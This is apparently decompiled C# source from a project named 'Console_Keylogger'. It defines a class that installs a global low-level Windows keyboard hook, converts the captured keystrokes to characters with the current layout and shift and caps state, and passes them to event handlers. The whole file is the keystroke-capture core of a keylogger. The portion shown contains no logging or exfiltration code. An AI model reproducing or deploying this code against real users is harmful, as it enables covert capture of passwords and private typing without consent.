using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Console_Keylogger;

public class UserActivityHook
{
	[StructLayout(LayoutKind.Sequential)]
	private class KeyboardHookStruct
	{
		public int vkCode;

		public int scanCode;

		public int flags;
	}

	private delegate int HookProc(int nCode, int wParam, IntPtr lParam);

	private const int WhKeyboardLl = 13;

	private const int WmKeydown = 256;

	private const int WmKeyup = 257;

	private const int WmSyskeydown = 260;

	private const int WmSyskeyup = 261;

	private const byte VkShift = 16;

	private const byte VkCapital = 20;

	private int _hKeyboardHook;

	private static HookProc _keyboardHookProcedure;

	public bool IsActive;

	public event KeyEventHandler KeyDown
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			this.KeyDown = (KeyEventHandler)Delegate.Combine((Delegate?)(object)this.KeyDown, (Delegate?)(object)value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			this.KeyDown = (KeyEventHandler)Delegate.Remove((Delegate?)(object)this.KeyDown, (Delegate?)(object)value);
		}
	}

	public event KeyPressEventHandler KeyPress
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			this.KeyPress = (KeyPressEventHandler)Delegate.Combine((Delegate?)(object)this.KeyPress, (Delegate?)(object)value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			this.KeyPress = (KeyPressEventHandler)Delegate.Remove((Delegate?)(object)this.KeyPress, (Delegate?)(object)value);
		}
	}

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, int dwThreadId);

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int idHook);

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int CallNextHookEx(int idHook, int nCode, int wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint idThread);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern short GetKeyState(int vKey);

	public void Start()
	{
		try
		{
			IsActive = true;
			if (_hKeyboardHook == 0)
			{
				_keyboardHookProcedure = KeyboardHookProc;
				_hKeyboardHook = SetWindowsHookEx(13, _keyboardHookProcedure, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
				if (_hKeyboardHook == 0)
				{
					Stop();
				}
			}
		}
		catch
		{
		}
	}

	public void Stop()
	{
		try
		{
			IsActive = false;
			if (_hKeyboardHook != 0)
			{
				UnhookWindowsHookEx(_hKeyboardHook);
				_hKeyboardHook = 0;
			}
		}
		catch
		{
		}
	}

	private int KeyboardHookProc(int nCode, int wParam, IntPtr lParam)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Expected O, but got Unknown
		try
		{
			bool flag = false;
			if (nCode >= 0 && (this.KeyDown != null || this.KeyPress != null))
			{
				KeyboardHookStruct keyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
				if (this.KeyDown != null && (wParam == 256 || wParam == 260))
				{
					Keys val = (Keys)keyboardHookStruct.vkCode;
					KeyEventArgs val2 = new KeyEventArgs(val);
					this.KeyDown.Invoke((object)this, val2);
					flag = val2.get_Handled();
				}
				if (this.KeyPress != null && wParam == 256)
				{
					bool flag2 = (GetKeyState(16) & 0x80) == 128;
					bool flag3 = GetKeyState(20) != 0;
					byte[] lpKeyState = new byte[256];
					StringBuilder stringBuilder = new StringBuilder();
					if (!GetKeyboardState(lpKeyState))
					{
						return 0;
					}
					uint wScanCode = MapVirtualKey((uint)keyboardHookStruct.scanCode, 0u);
					if (ToUnicodeEx((uint)keyboardHookStruct.vkCode, wScanCode, lpKeyState, stringBuilder, 5, (uint)keyboardHookStruct.flags, GetKeyboardLayout(0u)) == 1)
					{
						char c = stringBuilder[0];
						if ((flag3 ^ flag2) && char.IsLetter(c))
						{
							c = char.ToUpper(c);
						}
						KeyPressEventArgs val3 = new KeyPressEventArgs(c);
						this.KeyPress.Invoke((object)this, val3);
						flag = flag || val3.get_Handled();
					}
				}
				if (wParam == 257 || wParam == 261)
				{
					Keys val4 = (Keys)keyboardHookStruct.vkCode;
					KeyEventArgs val5 = new KeyEventArgs(val4);
					flag = flag || val5.get_Handled();
				}
			}
			return flag ? 1 : CallNextHookEx(_hKeyboardHook, nCode, wParam, lParam);
		}
		catch
		{
			return 0;
		}
	}
}
